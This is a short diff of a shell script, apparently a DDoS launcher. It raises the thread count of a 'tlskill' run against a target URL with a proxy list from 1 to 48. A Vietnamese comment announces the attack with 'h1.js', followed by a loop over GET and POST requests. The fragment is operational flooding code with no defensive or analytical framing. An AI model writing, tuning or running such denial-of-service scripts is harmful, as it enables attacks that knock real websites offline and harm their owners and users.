@@ -36,7 +36,7 @@ wait
 
 export NODE_OPTIONS=--max-old-space-size=8192
 
-node tlskill "$URL" "$TIME" 1 1 live.txt &
+node tlskill "$URL" "$TIME" 1 48 live.txt &
 
 # Chạy tấn công với h1.js
 for method in GET POST; do 
